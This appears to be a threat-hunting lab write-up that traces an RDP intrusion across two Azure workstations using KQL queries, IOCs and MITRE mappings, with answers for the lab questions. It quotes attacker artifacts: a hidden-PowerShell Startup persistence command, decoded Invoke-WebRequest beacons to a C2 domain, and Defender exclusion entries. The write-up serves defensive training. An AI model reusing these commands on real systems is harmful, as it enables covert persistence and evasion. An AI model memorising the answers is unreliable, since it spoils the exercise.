# Hunt Notes — Signal After The Noise

---

## P01 — Cold Trail (First Session)

**Finding:** First contact at 09:27:58 UTC from `173.244.55.131` (sarah-chen's machine) authenticating as `vmadminusername` to `azwks-phtg-02` via network logon. RDP session established at 09:41:11 UTC. sarah-chen is not a relay — her machine IS the operator's external launch point.

**Key Query:**
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13T09:40:00Z) .. datetime(2025-12-13T18:00:00Z))
| where RemoteDeviceName contains "sarah"
| project TimeGenerated, DeviceName, AccountName, LogonType, RemoteIP, RemoteDeviceName
| order by TimeGenerated asc
```

**IOCs:**
- External IP: `173.244.55.131`
- Launch point: `sarah-chen`
- Account: `vmadminusername`
- Target: `azwks-phtg-02`

![P01 — Cold Trail](assets/p01-cold-trail.png)

---

## P02 — First Footsteps (Earliest On-Host Activity)

**Finding:** At 09:48 the operator launched a pre-staged RDP file from the Downloads folder to pivot from `azwks-phtg-02` to `azwks-phtg-01`. The file was already present on disk — operator came prepared. CredentialUIBroker fired immediately after.

**Key Query:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T09:27:00Z) .. datetime(2025-12-13T10:00:00Z))
| where DeviceName == "azwks-phtg-02"
| where AccountName == "vmadminusername"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

**IOCs:**
- Pre-staged file: `C:\Users\vmAdminUsername\Downloads\azwks-phtg-01 (1).rdp`
- Process: `mstsc.exe`
- Pivot target: `azwks-phtg-01`

![P02 — First Footsteps](assets/p02-first-footsteps.png)

---

## P03 — Quiet Roots (Persistence)

**Finding:** Operator installed a Startup LNK at 10:13 executing a hidden PowerShell script on every logon. Staging directory `C:\ProgramData\PHTG\HealthCloud\Cache\` contains all operator tooling. `cleanmgr.exe /autoclean` used for anti-forensic cleanup.

**Key Query:**
```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-12-13T09:48:00Z) .. datetime(2025-12-13T11:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessAccountName == "vmadminusername"
| where ActionType == "FileCreated"
| where FileName contains "FLAG"
| project TimeGenerated, DeviceName, FileName, FolderPath, InitiatingProcessFileName
| order by TimeGenerated asc
```

**Persistence Mechanism:**
```powershell
LNK: C:\Users\vmAdminUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\PHTG HealthCloud.lnk

Executes: PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\PHTG\HealthCloud\Cache\task_FLAG-05.ps1
```

**IOCs:**
- `PHTG HealthCloud.lnk`
- `task_FLAG-05.ps1`
- `PHGTHealthCloudSvc.exe`
- `C:\ProgramData\PHTG\HealthCloud\Cache\`

![P03 — Quiet Roots](assets/p03-quiet-roots.png)

---

## P04 — The Beacon Pair (C2 Callouts)

**Finding:** Two Base64-encoded PowerShell payloads decoded to `Invoke-WebRequest` C2 check-ins. FLAG-09 hit `/api/checkin`, FLAG-10 hit `/api/status`. Output suppressed with `Out-Null`. Short 5-second timeout for silent failure.

**Key Query:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T10:10:00Z) .. datetime(2025-12-13T10:20:00Z))
| where DeviceName == "azwks-phtg-01"
| where FileName == "powershell.exe" or FileName == "pwsh.exe"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Decoded Payloads:**
```powershell
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/checkin?flag=FLAG-09&device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null

Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?flag=FLAG-10&device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
```

**IOCs:**
- `status.health-cloud.cc`
- `updates.health-cloud.cc`
- `-EncodedCommand` (obfuscation)

![P04 — Beacon Pair](assets/p04-beacon-pair.png)

---

## P05 — Outbound Whispers (Where Traffic Went)

**Finding:** Both beacons confirmed reaching Cloudflare-fronted IPs on port 443/TLS. DNS resolved via Azure internal resolver. Two subdomains split C2 functions — `updates` for tasking, `status` for check-in.

**Key Query:**
```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-12-13T10:12:00Z) .. datetime(2025-12-13T10:16:00Z))
| where DeviceName == "azwks-phtg-01"
| where RemoteUrl contains "health-cloud" or RemoteIP != ""
| project TimeGenerated, DeviceName, ActionType, RemoteIP, RemoteUrl, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**C2 Infrastructure:**
```
health-cloud.cc
├── updates.health-cloud.cc → 104.21.36.232 (Cloudflare)
└── status.health-cloud.cc  → 172.67.200.204 (Cloudflare)
```

**IOCs:**
- `104.21.36.232`
- `172.67.200.204`
- Port `443` / TLS

![P05 — Outbound Whispers](assets/p05-outbound-whispers.png)

---

## P06 — Doors Held Open (Defence Evasion)

**Finding:** `amsi_probe.ps1` tested AMSI coverage. Operator added Defender path exclusions for `Documents\PHTG` and the Cache directory, plus a process exclusion for `PHGTHealthCloudSvc.exe`. All written via `msmpeng.exe` — Defender blinded itself to the operator's entire toolset.

**Key Query:**
```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where RegistryKey contains "Defender"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName
| order by TimeGenerated asc
```

**Registry Changes:**
```powershell
HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths → C:\Users\vmAdminUsername\Documents\PHTG
HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths → C:\ProgramData\PHTG\HealthCloud\Cache
HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes → C:\ProgramData\PHTG\HealthCloud\PHGTHealthCloudSvc.exe
```

**IOCs:**
- `amsi_probe.ps1`
- `msmpeng.exe` (writing its own exclusions)
- `PHGTHealthCloudSvc.exe`

![P06 — Doors Held Open](assets/p06-doors-held-open.png)

---

## P07 — Hands on the Vault (Final Actions)

**Finding:** `phtg_activity.ps1` drove Edge to `login.microsoftonline.com` repeatedly — operator targeting M365 authentication. At 15:55 operator went hands-on-keyboard launching notepad, calc, and mspaint interactively confirming live desktop access. Scheduled task persistence confirmed firing independently at 13:40 and 15:55 without active RDP session.

**Key Query:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T10:30:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where AccountName == "vmadminusername"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

**Timeline:**

| Time | Event |
|---|---|
| 10:40 | `msedge` → `login.microsoftonline.com` (M365 auth attempt) |
| 13:40 | `phtg_activity.ps1` fires via scheduled task (persistence confirmed) |
| 15:55 | `notepad.exe`, `calc.exe`, `mspaint.exe` — hands-on-keyboard confirmed |
| 17:00 | Activity still ongoing |

**IOCs:**
- `C:\Lab\phtg_activity.ps1`
- `login.microsoftonline.com`
- `msedge.exe` (operator-driven)

![P07 — M365 Auth](assets/p07-m365-auth.png)
![P07 — Scheduled Task](assets/p07-scheduled-task.png)
![P07 — Hands on Keyboard](assets/p07-hands-on-keyboard.png)

---

## Q01 — The Brute Force Assumption

**Finding:** Failed logons showed `UnauthorizedLogonType` — not wrong passwords. Credentials were valid from the start. Operator authenticated as `vmadminusername` FROM sarah-chen's machine. No brute force indicators (no username variation, no multiple source IPs on failures).

**Key Query:**
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T09:28:00Z))
| where DeviceName == "azwks-phtg-02"
| where ActionType == "LogonFailed"
| project TimeGenerated, AccountName, LogonType, RemoteIP, FailureReason
| order by TimeGenerated asc
```

**MITRE:** T1078 — Valid Accounts  
**Answer:** `credential reuse`

![Q01 — Brute Force Assumption](assets/q01-brute-force-assumption.png)

---

## Q02 — Lateral Movement Summary

**Finding:** At 09:48 operator used `mstsc.exe` with a pre-staged RDP file to move from `azwks-phtg-02` to `azwks-phtg-01`. Source IP is the internal IP of phtg-02.

**Key Query:**
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
| where RemoteIP == "10.0.0.152"
| project TimeGenerated, DeviceName, AccountName, LogonType, RemoteIP, RemoteDeviceName
| order by TimeGenerated asc
```

**MITRE:** T1021 — Remote Services (RDP)  
**Answer:** `vmadminusername, 10.0.0.152, azwks-phtg-01`

![Q02 — Lateral Movement](assets/q02-lateral-movement.png)

---

## Q03 — Onward Movement Check

**Finding:** Operator did not pivot further from `azwks-phtg-01` (10.0.0.105) to any other host. Lateral movement stopped at the second hop.

**Key Query:**
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13T09:48:00Z) .. datetime(2025-12-13T18:00:00Z))
| where RemoteIP == "10.0.0.105"
| project TimeGenerated, DeviceName, AccountName, LogonType, RemoteIP, RemoteDeviceName
| order by TimeGenerated asc
```

**Answer:** `None` — no further lateral movement detected.

![Q03 — Onward Movement](assets/q03-onward-movement.png)
